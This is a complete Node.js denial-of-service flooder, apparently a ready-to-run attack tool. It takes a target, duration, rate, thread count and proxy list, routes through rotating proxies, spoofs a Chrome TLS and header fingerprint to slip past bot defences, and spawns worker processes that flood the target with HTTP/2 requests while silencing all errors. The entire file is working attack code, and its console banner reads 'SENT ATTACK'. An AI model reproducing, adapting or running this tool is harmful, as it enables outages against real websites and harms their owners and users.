const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const colors = require("colors");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const cplist = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384"
];

const cipper = cplist[Math.floor(Math.random() * cplist.length)];
process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = ["ecdsa_secp256r1_sha256", "rsa_pss_rsae_sha256", "rsa_pkcs1_sha256"];
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE;

if (process.argv.length < 7) {
    console.log("Usage: host time req thread proxy.txt");
    process.exit();
}

const secureProtocol = "TLS_method";

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/);
const parsedTarget = url.parse(args.target);
const parsedPort = parsedTarget.protocol === "https:" ? 443 : 80;

const baseHeaders = {
    ":method": "GET",
    ":authority": parsedTarget.host,
    ":scheme": "https",
    ":path": parsedTarget.path,
    "sec-ch-ua": '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9"
};

class NetSocket {
    HTTP(options, callback) {
        const payload =
            "CONNECT " +
            options.address +
            ":443 HTTP/1.1\r\nHost: " +
            options.address +
            ":443\r\nConnection: Keep-Alive\r\n\r\n";

        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 600000);
        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        connection.on("connect", () => connection.write(buffer));

        connection.on("data", chunk => {
            if (!chunk.toString("utf-8").includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "bad proxy");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "timeout");
        });
    }
}

const Socker = new NetSocket();

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 10
    };

    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return;

        connection.setKeepAlive(true, 600000);
        connection.setNoDelay(true);

        const tlsConn = tls.connect(parsedPort, parsedTarget.host, {
            port: parsedPort,
            secure: true,
            ALPNProtocols: ["h2"],
            ciphers: cipper,
            sigalgs: sigalgs,
            requestCert: true,
            socket: connection,
            ecdhCurve: ecdhCurve,
            honorCipherOrder: false,
            rejectUnauthorized: false,
            secureOptions: secureOptions,
            secureContext: tls.createSecureContext({
                ciphers: ciphers,
                sigalgs: sigalgs.join(":"),
                secureOptions: secureOptions,
                secureProtocol: secureProtocol
            }),
            host: parsedTarget.host,
            servername: parsedTarget.host
        });

        tlsConn.setKeepAlive(true, 600000);
        tlsConn.setNoDelay(true);

        const client = http2.connect(parsedTarget.href, {
            createConnection: () => tlsConn,
            settings: {
                headerTableSize: 65536,
                maxHeaderListSize: 32768,
                initialWindowSize: 15564991,
                maxFrameSize: 16384
            }
        });

        client.setMaxListeners(0);

        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {

                    const request = client.request(
                        { ...baseHeaders },
                        {
                            parent: 0,
                            exclusive: true,
                            weight: 220
                        }
                    );

                    request.on("response", () => {
                        request.close();
                        request.destroy();
                    });

                    request.end();
                }
            }, 300);
        });

        const kill = () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        };

        client.on("close", kill);
        client.on("error", kill);
        client.on("timeout", kill);
    });
}

if (cluster.isMaster) {
    console.clear();
    console.log("SENT ATTACK | CRISXTOP".brightBlue);
    console.log("--------------------------------------------".gray);

    for (let i = 0; i < args.threads; i++) cluster.fork();
} else {
    setInterval(runFlooder);
}

setTimeout(() => process.exit(1), args.time * 1000);

process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});
